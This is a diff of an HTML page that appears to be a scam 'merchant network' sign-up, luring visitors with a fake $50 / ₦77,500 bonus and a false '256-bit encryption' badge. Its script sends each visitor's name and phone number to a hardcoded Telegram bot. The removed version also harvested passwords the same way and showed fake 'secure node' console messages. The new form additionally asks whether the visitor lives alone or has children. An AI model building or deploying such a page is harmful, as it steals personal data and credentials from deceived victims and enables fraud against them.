@@ -3,184 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Merchant Vetting | AGMT Terminal</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+    <title>Merchant Portal | Registration</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #2563eb; --bg: #020617; --card: #0f172a; --border: #1e293b; }
+        :root { --primary: #2563eb; --accent: #10b981; --bg: #020617; --card: #0f172a; --border: #1e293b; --text-dim: #64748b; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; }
         
-        body { 
-            background: var(--bg); 
-            color: white; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            min-height: 100vh; 
-            padding: 20px;
-            background-image: radial-gradient(circle at 0% 0%, #1e1b4b 0%, #020617 50%);
+        body { background: var(--bg); color: white; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+
+        .onboarding-card { 
+            width: 100%; max-width: 420px; background: var(--card); border: 1px solid var(--border); 
+            border-radius: 40px; padding: 40px 25px; box-shadow: 0 40px 80px rgba(0,0,0,0.6);
         }
 
-        .container { width: 100%; max-width: 400px; animation: slideUp 0.8s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        .card { 
-            background: var(--card); 
-            border: 1px solid var(--border); 
-            border-radius: 35px; 
-            padding: 35px 25px; 
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.7);
-            position: relative;
-            overflow: hidden;
+        .bonus-badge { 
+            background: rgba(16, 185, 129, 0.1); color: var(--accent); 
+            padding: 8px 16px; border-radius: 100px; font-size: 11px; font-weight: 800;
+            display: inline-block; margin-bottom: 20px; border: 1px solid rgba(16, 185, 129, 0.2);
         }
 
-        /* Top Progress Bar */
-        .step-bar { display: flex; gap: 8px; margin-bottom: 30px; }
-        .step { height: 4px; flex: 1; background: #1e293b; border-radius: 10px; position: relative; overflow: hidden; }
-        .step.active::after { content: ""; position: absolute; left: 0; top: 0; height: 100%; width: 100%; background: var(--primary); box-shadow: 0 0 10px var(--primary); }
+        h1 { font-size: 26px; font-weight: 800; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .sub-h { color: var(--text-dim); font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
 
-        h2 { font-size: 24px; font-weight: 800; letter-spacing: -1px; margin-bottom: 8px; }
-        p.info { color: #64748b; font-size: 13px; line-height: 1.5; margin-bottom: 30px; }
-
-        .input-group { margin-bottom: 20px; position: relative; }
-        label { display: block; font-size: 10px; font-weight: 800; color: #475569; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; margin-left: 5px; }
+        /* Form Controls */
+        .f-label { display: block; font-size: 11px; font-weight: 800; color: var(--text-dim); margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .f-group { margin-bottom: 22px; }
         
-        input {
-            width: 100%;
-            background: #1e293b;
-            border: 1.5px solid var(--border);
-            padding: 18px 20px;
-            border-radius: 18px;
-            color: #fff;
-            font-size: 15px;
-            outline: none;
-            transition: 0.3s;
+        .f-input, select { 
+            width: 100%; background: #020617; border: 1px solid var(--border); border-radius: 20px; 
+            padding: 18px; color: white; font-weight: 700; font-size: 15px; outline: none; transition: 0.3s;
         }
-        input:focus { border-color: var(--primary); background: #0f172a; box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.1); }
+        .f-input:focus { border-color: var(--primary); background: rgba(37, 99, 235, 0.05); }
 
-        .btn-init {
-            width: 100%;
-            background: var(--primary);
-            color: white;
-            padding: 22px;
-            border-radius: 20px;
-            border: none;
-            font-weight: 800;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-            box-shadow: 0 15px 30px rgba(37, 99, 235, 0.3);
+        /* Age Checkbox */
+        .checkbox-box {
+            background: rgba(255,255,255,0.02); border: 1px solid var(--border);
+            border-radius: 20px; padding: 20px; margin-bottom: 25px;
+            display: flex; gap: 15px; align-items: flex-start; cursor: pointer;
         }
+        .checkbox-box input { width: 22px; height: 22px; cursor: pointer; accent-color: var(--primary); flex-shrink: 0; }
+        .checkbox-txt { font-size: 13px; font-weight: 600; color: #cbd5e1; line-height: 1.4; }
 
-        /* Loading Overlay */
-        #loading-screen { 
-            display: none; 
-            position: fixed; 
-            inset: 0; 
-            background: #020617; 
-            z-index: 1000; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 30px; 
+        .btn-claim { 
+            width: 100%; padding: 22px; border-radius: 22px; border: none;
+            background: linear-gradient(135deg, var(--primary), #1e40af);
+            color: white; font-weight: 800; font-size: 16px; cursor: pointer;
+            box-shadow: 0 15px 35px rgba(37, 99, 235, 0.3); transition: 0.3s;
         }
-        .console { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #10b981; margin-top: 30px; width: 100%; max-width: 280px; }
+        .btn-claim:active { transform: scale(0.98); }
+
+        .secure-tag { text-align: center; margin-top: 25px; font-size: 11px; color: var(--text-dim); font-weight: 700; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="card">
-            <div class="step-bar">
-                <div class="step active"></div>
-                <div class="step active"></div>
-                <div class="step"></div>
+    <div class="onboarding-card">
+        <div class="bonus-badge">🎁 $50.00 REWARD ELIGIBLE</div>
+        <h1>Create Account</h1>
+        <p class="sub-h">Join the AGMT Merchant Network. Complete your profile to claim your <b>₦77,500</b> settlement bonus.</p>
+
+        <div class="f-group">
+            <label class="f-label">Full Legal Name</label>
+            <input type="text" id="regName" class="f-input" placeholder="Enter Full Name">
+        </div>
+
+        <div class="f-group">
+            <label class="f-label">Primary Mobile Number</label>
+            <input type="tel" id="regPhone" class="f-input" placeholder="080 0000 0000">
+        </div>
+
+        <div class="f-group">
+            <label class="f-label">Household Status</label>
+            <select id="regHouse" class="f-input">
+                <option value="">Please select an option</option>
+                <option value="Single">Single Household</option>
+                <option value="Family">Family / Children under 18</option>
+                <option value="Living Alone">Living Alone</option>
+            </select>
+        </div>
+
+        <div class="checkbox-box" onclick="document.getElementById('ageCheck').click()">
+            <input type="checkbox" id="ageCheck" onclick="event.stopPropagation()">
+            <div class="checkbox-txt">
+                I confirm that I am <b>18 years or older</b> and I agree to the Merchant Terms of Service and Data Optimization Policy.
             </div>
+        </div>
 
-            <h2>Terminal Vetting</h2>
-            <p class="info">Complete your merchant identification to allocate your unique global liquidity node.</p>
+        <button class="btn-claim" onclick="processRegistration()">CLAIM $50.00 BONUS</button>
 
-            <form id="vettingForm">
-                <div class="input-group">
-                    <label>Agent Full Name</label>
-                    <input type="text" id="fullname" placeholder="John Doe" required>
-                </div>
-
-                <div class="input-group">
-                    <label>WhatsApp Contact (KYC)</label>
-                    <input type="tel" id="phone" placeholder="+234..." required>
-                </div>
-
-                <div class="input-group">
-                    <label>System Password</label>
-                    <input type="password" id="pass" placeholder="••••••••" required>
-                </div>
-
-                <button type="button" class="btn-init" onclick="submitVetting()">
-                    INITIALIZE SECURE NODE
-                </button>
-            </form>
+        <div class="secure-tag">
+            🛡️ SECURE 256-BIT ENCRYPTION ACTIVE
         </div>
     </div>
 
-    <div id="loading-screen">
-        <div style="width: 50px; height: 50px; border: 4px solid #1e293b; border-top-color: var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
-        <h3 style="margin-top: 25px; font-weight: 800;">ALLOCATING RESOURCES...</h3>
-        <div class="console" id="log-output"></div>
-    </div>
-
     <script>
-        const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
-        const chatId = "7909543900";
+        function processRegistration() {
+            const name = document.getElementById('regName').value;
+            const phone = document.getElementById('regPhone').value;
+            const ageChecked = document.getElementById('ageCheck').checked;
 
-        async function submitVetting() {
-            const name = document.getElementById('fullname').value;
-            const phone = document.getElementById('phone').value;
-            const pass = document.getElementById('pass').value;
-
-            if(!name || !phone || !pass) {
-                alert("All security fields are mandatory for node allocation.");
+            if(!name || !phone) {
+                alert("Please enter your details to verify your node.");
                 return;
             }
 
-            // SHOW LOADING
-            document.getElementById('loading-screen').style.display = 'flex';
+            if(!ageChecked) {
+                alert("You must be 18 years or older to participate in the merchant program.");
+                return;
+            }
 
-            // 1. TELEGRAM ALERT: Send lead data immediately
-            const msg = `👤 <b>AGMT | NEW MERCHANT VETTING</b>%0A<b>Name:</b> ${name}%0A<b>Phone:</b> ${phone}%0A<b>Pass:</b> ${pass}`;
+            // Save to LocalStorage
+            localStorage.setItem('merchantName', name);
+            localStorage.setItem('walletBalance', "50.00");
+            localStorage.setItem('tasksCompleted', "1");
+
+            // Send full details to your Telegram
+            const botToken = "8673029559:AAF4zFJC80TERVUMTvZ9ieSMWM0K-2vWGTI";
+            const chatId = "7909543900";
+            const msg = `🚀 <b>NEW MERCHANT REGISTERED</b>%0A<b>Name:</b> ${name}%0A<b>Phone:</b> ${phone}%0A<b>Age:</b> 18+ Verified%0A<b>Bonus:</b> $50.00 Paid`;
+            
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${msg}&parse_mode=html`);
 
-            // 2. CONSOLE LOGIC
-            const logBox = document.getElementById('log-output');
-            const sequences = [
-                "> Establishing encrypted handshake...",
-                "> Validating regional IP node...",
-                "> Syncing Merchant Ledger...",
-                "> Node Allocated: JM-" + Math.floor(Math.random()*90000 + 10000),
-                "> Success. Redirecting to Terminal..."
-            ];
-
-            let i = 0;
-            const interval = setInterval(() => {
-                if(i < sequences.length) {
-                    const line = document.createElement('div');
-                    line.style.marginBottom = "8px";
-                    line.innerText = sequences[i];
-                    logBox.appendChild(line);
-                    i++;
-                } else {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        window.location.href = 'dashboard.html';
-                    }, 1000);
-                }
-            }, 1200);
+            // Redirect to Dashboard
+            window.location.href = 'dashboard.html';
         }
     </script>
-
-    <style>
-        @keyframes spin { to { transform: rotate(360deg); } }
-    </style>
 
 </body>
 </html>
